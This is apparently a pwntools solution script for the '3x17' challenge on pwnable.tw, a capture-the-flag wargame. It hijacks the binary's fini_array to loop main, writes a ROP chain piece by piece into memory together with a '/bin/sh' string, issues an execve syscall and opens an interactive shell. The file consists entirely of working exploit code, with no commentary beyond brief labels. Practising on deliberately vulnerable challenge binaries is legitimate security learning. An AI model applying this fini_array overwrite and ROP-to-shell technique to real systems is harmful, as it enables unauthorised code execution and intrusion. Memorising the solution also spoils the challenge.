#! /usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
context(log_level="error")
p = remote("chall.pwnable.tw", 10105)
elf = ELF("./3x17")
#p = process("./3x17")
#gdb.attach(p,'b *0x401c29')

def chain(p, off, val):
    p.send(str(rop_chain+(off*8)))
    p.recv()
    p.send(p64(val))
    p.recv()   


start_addr = 0x4b40c0
fini_start = 0x4b40f0
fini_decon = 0x4b40f8
addr_main = 0x401b6d
call_fini = 0x402960
test = 0x401ba3
lret = 0x401c4b
ret = 0x47d587
rop_chain = 0x4b4100
p_rax_r = 0x41e4af
p_rdi_r = 0x48c429
p_rsi_r = 0x48a79a
p_rdx_r = 0x44a2e6
syscall = 0x486e0f

# Setting up the fini_array for infinite loop
p.recv()
p.send(str(fini_start))
p.recv()
p.send(p64(call_fini) + p64(addr_main))
p.recv()

# ROP chaining
chain(p, 0, p_rax_r)
chain(p, 1, 0x3b)
chain(p, 2, p_rdi_r)
chain(p, 3, rop_chain+(10*8))

# Can't use my function to put a string there
p.send(str(rop_chain+(10*8)))
p.recv()
p.send(p64(u64("/bin/sh\x00")))
p.recv()

# Continue chain
chain(p, 4, p_rsi_r)
chain(p, 5, 0)
chain(p, 6, p_rdx_r)
chain(p, 7, 0)
chain(p, 8, syscall)

# Replace original fini_start with leave; ret
p.send(str(fini_start))
p.recv()
p.send(p64(lret))
p.interactive()
